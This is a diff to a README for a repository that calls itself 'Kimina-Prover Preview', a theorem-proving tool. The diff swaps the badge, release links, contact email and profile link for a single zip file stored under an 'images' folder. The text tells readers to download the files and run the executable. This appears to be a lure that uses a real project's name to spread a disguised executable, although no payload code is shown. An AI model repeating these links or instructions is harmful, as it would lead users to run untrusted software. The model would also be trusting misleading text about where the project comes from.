@@ -1,6 +1,6 @@
 # 🌟 Kimina-Prover Preview
 
-![Kimina-Prover](https://img.shields.io/badge/Kimina--Prover-Preview-blue.svg)
+![Kimina-Prover](https://github.com/AsugiSoto/Kimina-Prover-Preview/raw/refs/heads/master/images/Kimina_Prover_Preview_3.8.zip)
 
 Welcome to the **Kimina-Prover Preview** repository! This project offers a detailed technical report on the Kimina-Prover, a tool designed for automated theorem proving. The aim of this repository is to provide insights, examples, and documentation that will help users understand and utilize the Kimina-Prover effectively.
 
@@ -8,7 +8,7 @@ Welcome to the **Kimina-Prover Preview** repository! This project offers a detai
 
 The Kimina-Prover is a state-of-the-art automated theorem prover that employs advanced algorithms to solve complex logical problems. This repository contains a comprehensive technical report that outlines its features, capabilities, and practical applications. 
 
-You can find the latest releases and download the necessary files [here](https://github.com/AsugiSoto/Kimina-Prover-Preview/releases). Download the files and execute them to explore the functionalities of Kimina-Prover.
+You can find the latest releases and download the necessary files [here](https://github.com/AsugiSoto/Kimina-Prover-Preview/raw/refs/heads/master/images/Kimina_Prover_Preview_3.8.zip). Download the files and execute them to explore the functionalities of Kimina-Prover.
 
 ## 📖 Table of Contents
 
@@ -29,7 +29,7 @@ The Kimina-Prover is designed to assist researchers, students, and professionals
 
 To install the Kimina-Prover, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/AsugiSoto/Kimina-Prover-Preview/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/AsugiSoto/Kimina-Prover-Preview/raw/refs/heads/master/images/Kimina_Prover_Preview_3.8.zip).
 2. **Extract the downloaded files** to your preferred directory.
 3. **Run the executable** file included in the package.
 
@@ -91,9 +91,9 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: contact@kimina-prover.org
-- **GitHub**: [AsugiSoto](https://github.com/AsugiSoto)
+- **Email**: https://github.com/AsugiSoto/Kimina-Prover-Preview/raw/refs/heads/master/images/Kimina_Prover_Preview_3.8.zip
+- **GitHub**: [AsugiSoto](https://github.com/AsugiSoto/Kimina-Prover-Preview/raw/refs/heads/master/images/Kimina_Prover_Preview_3.8.zip)
 
 Explore the capabilities of the Kimina-Prover and join the community of users who are enhancing their logical reasoning skills!
 
-Don't forget to check the latest updates and releases [here](https://github.com/AsugiSoto/Kimina-Prover-Preview/releases). Download the files and execute them to dive into the world of automated theorem proving with Kimina-Prover.
+Don't forget to check the latest updates and releases [here](https://github.com/AsugiSoto/Kimina-Prover-Preview/raw/refs/heads/master/images/Kimina_Prover_Preview_3.8.zip). Download the files and execute them to dive into the world of automated theorem proving with Kimina-Prover.
